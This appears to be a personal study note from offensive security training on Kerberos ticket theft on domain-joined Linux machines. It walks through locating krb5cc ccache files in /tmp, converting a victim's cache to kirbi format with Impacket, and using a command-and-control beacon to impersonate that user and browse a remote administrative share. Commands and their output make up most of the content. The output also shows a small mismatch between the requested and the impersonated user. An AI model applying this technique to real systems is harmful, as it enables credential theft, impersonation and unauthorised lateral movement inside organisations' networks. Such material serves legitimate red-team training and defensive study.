---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Linux Credential Cache]]  
___

## Description:  
For Linux domain joined machines

Kerberos Credential Cache (ccache) files hold the Kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. If you compromise such a machine, you can extract the ccache of any authenticated user and use it to request service tickets (TGSs) for any other service in the domain.

The ccache files are stored in `/tmp` and are prefixed with `krb5cc`.

```
svc_oracle@nix-1:~$ ls -l /tmp/
total 20
-rw------- 1 jking      domain users 1342 Mar  9 15:21 krb5cc_1394201122_MerMmG
-rw------- 1 svc_oracle domain users 1341 Mar  9 15:33 krb5cc_1394201127_NkktoD
```

We can see by the permission column that only the user and root can access them

Use this root to download `krb5cc_1394201122_MerMmG` to your Kali VM.

we can use **Impacket** to convert this ticket from **ccache** to **kirbi** format.

```
root@kali:~# impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done

```

Now we can use this kirbi with a sacrificial logon session.

```
beacon> make_token DEV\jking FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     03/09/2021 12:32:56   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/09/2021 12:30:35   pagefile.sys
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (01:27 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
